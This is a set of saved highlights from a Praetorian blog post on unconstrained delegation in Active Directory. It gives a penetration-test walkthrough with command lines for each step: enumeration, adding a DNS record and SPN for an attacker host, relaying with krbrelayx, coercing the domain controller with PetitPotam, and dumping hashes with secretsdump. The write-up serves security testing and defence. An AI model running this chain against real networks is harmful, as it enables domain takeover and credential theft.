---
author: "Thomas Tan"
aliases: "Unconstrained Delegation in Active Directory"
tags: 
- RW_inbox
- readwise/articles
url: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/?__readwiseLocation=
date: 2025-04-24
summary: Overview Unconstrained delegation is a feature in Active Directory that allows a computer, service, or user to impersonate any other user and access resources on their behalf across the entire network, completely unrestricted. A typical example of a use case for unconstrained delegation is when certain services require access to another server or back-end database. […]
The post Unconstrained Delegation in Active Directory appeared first on Praetorian.
---
# Unconstrained Delegation in Active Directory

![rw-book-cover](https://www.praetorian.com/wp-content/uploads/2021/01/cropped-Praetorian-Favicon-32x32.png)

## Highlights


Unconstrained delegation is a feature in Active Directory that allows a computer, service, or user to impersonate any other user and access resources on their behalf across the entire network, completely unrestricted. [](https://read.readwise.io/read/01j5xag5w3t6f9hyn8zz5c0mfp)



When a user authenticates to a computer with unconstrained delegation, that user’s Kerberos Ticket Granting Ticket (TGT) gets saved to that computer’s memory so the computer can impersonate the authenticated user when required for accessing resources on that user’s behalf. [](https://read.readwise.io/read/01j5xagwfy30dmpvqvabd4tkvw)



Enumeration
 Using the Impacket suite of tools, all delegation rights within the domain can be enumerated with findDelegation.py.
 The syntax is as follows:
 `findDelegation.py -dc-ip domain.local/USERNAME`
 ![](https://www.praetorian.com/wp-content/uploads/2024/07/unconstrained-delegtaion-enumeration.png) [](https://read.readwise.io/read/01j5xahdgv2nh9hzsj4a9pwdry)



Abuse
 Once Praetorian had performed a kerberoasting attack and subsequently cracked the user’s ticket, Praetorian engineers abused this unconstrained delegation privilege to escalate themselves to Domain Administrator.
 To begin, Praetorian engineers added a DNS record for the Linux machine they were operating on. This was done with Dirkjanm’s dnstool.py. The syntax is as follows:
 `dnstool.py -u ‘domain/user’ -p -r attacker.domain.local -a add -t A -d` 
 Once Praetorian had assigned their machine a DNS record, Praetorian modified the Service Principal Name (SPN) of the user configured for unconstrained delegation. This was done with Dirkjanm’s addspn.py.
 ![](https://www.praetorian.com/wp-content/uploads/2024/07/unconstrained-delegation-abuse.png)
 The syntax is as follows:
 `addspn.py -u ‘domain/unconstraineduser’ -p ‘password’ –spn cifs/attacker.domain.com ‘DC.domain.com’`
 Once the SPN is modified, Praetorian could coerce authentication from the Domain Controller, relay the authentication with Dirkjanm’s krbrelayx, and escalate themselves to Domain Administrator.
 To set up the relay attack, the syntax is as follows:
 ![](https://www.praetorian.com/wp-content/uploads/2024/07/unconstrained-delegation-relay-attack.png)
 `krbrelayx.py -s DOMAIN.LOCALunconstraineduser -p ‘password’ –t DC.domain.com`
 Once krbrelayx is set up, to coerce authentication, a tool such as Coercer or PetitPotam can be used. Praetorian opted to use PetitPotam in this situation.
 **The syntax for PetitPotam is as follows:**
 `PetitPotam.py -u -d -p` 
 After PetitPotam runs, krbrelayx.py will intercept and relay the coerced authentication, and output a .ccache file for the Domain Controller. This can be imported as an environment variable with the command export KRB5CCNAME=DC.ccache. Once the .ccache file was set in the environment variable, Praetorian could dump a Domain Controller’s NT hash from the Domain Controller’s NTDS.dit using Impacket’s secretsdump.py, ultimately compromising the domain.
 ![](https://www.praetorian.com/wp-content/uploads/2024/07/unconstrained-delegation-syntax.png)
 **The syntax is as follows:**
 `secretsdump.py ‘domain.com/DC$@DC.domain.com’ -k -just-dc-user ADMIN` [](https://read.readwise.io/read/01j5xajqhkkqe1jztet4j4rhxx)

